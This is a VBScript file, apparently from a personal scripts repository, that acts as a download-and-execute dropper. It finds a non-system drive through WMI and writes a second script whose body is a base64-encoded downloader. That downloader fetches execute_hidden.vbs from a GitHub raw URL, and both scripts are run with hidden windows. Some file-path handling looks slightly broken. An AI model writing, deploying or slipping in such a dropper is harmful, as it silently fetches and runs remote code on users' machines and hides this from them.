' vbs
' execute.vbs
' github.com/tomwisniewskiprv/scripts/vbs
'
' This small script downloads something from internet and then executes it
'
' “If you don't execute your ideas, they die” ~ Roger Von Oech
' -------------------------------------------------------------------------'

' Base64 DECODE
' -------------
Function Base64Decode(base64String)
  Const Base64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
  Dim dataLength, sOut, groupBegin

  base64String = Replace(base64String, vbCrLf, "")
  base64String = Replace(base64String, vbTab, "")
  base64String = Replace(base64String, " ", "")

  dataLength = Len(base64String)
  If dataLength Mod 4 <> 0 Then
    Err.Raise 1, "Base64Decode", "Bad Base64 string."
    Exit Function
  End If

  For groupBegin = 1 To dataLength Step 4
    Dim numDataBytes, CharCounter, thisChar, thisData, nGroup, pOut
    numDataBytes = 3
    nGroup = 0

    For CharCounter = 0 To 3

      thisChar = Mid(base64String, groupBegin + CharCounter, 1)

      If thisChar = "=" Then
        numDataBytes = numDataBytes - 1
        thisData = 0
      Else
        thisData = InStr(1, Base64, thisChar, vbBinaryCompare) - 1
      End If
      If thisData = -1 Then
        Err.Raise 2, "Base64Decode", "Bad character In Base64 string."
        Exit Function
      End If

      nGroup = 64 * nGroup + thisData
    Next

    nGroup = Hex(nGroup)

    nGroup = String(6 - Len(nGroup), "0") & nGroup


    pOut = Chr(CByte("&H" & Mid(nGroup, 1, 2))) + _
      Chr(CByte("&H" & Mid(nGroup, 3, 2))) + _
      Chr(CByte("&H" & Mid(nGroup, 5, 2)))

    sOut = sOut & Left(pOut, numDataBytes)
  Next

  Base64Decode = sOut
End Function
' END FUNCTION


' create file somewhere but not on C: and fill the logic
' -----------------------------------------------------
Set objShellA = WScript.CreateObject("WScript.Shell")
Dim writen 
writen = False

' file object
Set objFSO=CreateObject("Scripting.FileSystemObject")

ComputerName = "."
Set wmiServices  = GetObject ( _
    "winmgmts:{impersonationLevel=Impersonate}!//" & ComputerName)

Set wmiDiskDrives =  wmiServices.ExecQuery ( "SELECT Caption, DeviceID FROM Win32_DiskDrive")

For Each wmiDiskDrive In wmiDiskDrives
   
    query = "ASSOCIATORS OF {Win32_DiskDrive.DeviceID='" _
        & wmiDiskDrive.DeviceID & "'} WHERE AssocClass = Win32_DiskDriveToDiskPartition"    
    Set wmiDiskPartitions = wmiServices.ExecQuery(query)

    For Each wmiDiskPartition In wmiDiskPartitions
        
        Set wmiLogicalDisks = wmiServices.ExecQuery _
            ("ASSOCIATORS OF {Win32_DiskPartition.DeviceID='" _
             & wmiDiskPartition.DeviceID & "'} WHERE AssocClass = Win32_LogicalDiskToPartition") 

        For Each wmiLogicalDisk In wmiLogicalDisks
			
			' write to disk 'letter'
			letter = wmiLogicalDisk.DeviceID
			
			if letter <> "C:" and writen <> True Then
			
				' write the content 
				outFile = letter & "\execute_download_2.vbs "
				Set objFile = objFSO.CreateTextFile(outFile,True)
				objFile.Write "Set args = Wscript.Arguments" & vbCrLf 
								
				foo = Base64Decode("CQkJCWRpbSB4SHR0cDogU2V0IHhIdHRwID0gY3JlYXRlb2JqZWN0KCJNaWNyb3NvZnQuWE1MSFRUUCIpDQoJCQkJZGltIGJTdHJtOiBTZXQgYlN0cm0gPSBjcmVhdGVvYmplY3QoIkFkb2RiLlN0cmVhbSIpDQoNCgkJCQl4SHR0cC5PcGVuICJHRVQiLCAiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2VjaGVsb24xMzM3L3Zic19zY3JpcHRzL21hc3Rlci9leGVjdXRlX2hpZGRlbi52YnMiLCBGYWxzZQ0KCQkJCXhIdHRwLlNlbmQNCg0KCQkJCXdpdGggYlN0cm0NCgkJCQkJLnR5cGUgPSAxICcJCQkJCQkJLy9iaW5hcnkNCgkJCQkJLm9wZW4NCgkJCQkJLndyaXRlIHhIdHRwLnJlc3BvbnNlQm9keQ0KCQkJCQkuc2F2ZXRvZmlsZSBhcmdzLml0ZW0oMCkgJiAiZXhlY3V0ZV9oaWRkZW4udmJzIiwgMiAnLy9vdmVyd3JpdGUNCgkJCQllbmQgd2l0aA==")
				
				objFile.Write foo
			
				objFile.Close
				
				writen = True
			End If

        Next      
    Next
Next

 
' download script
args = letter & "\"
objShellA.run outFile & args, 0, True

' read the path and execute downloaded script
objShellA.run letter & "execute_hidden.vbs", 0, True

Wscript.Quit
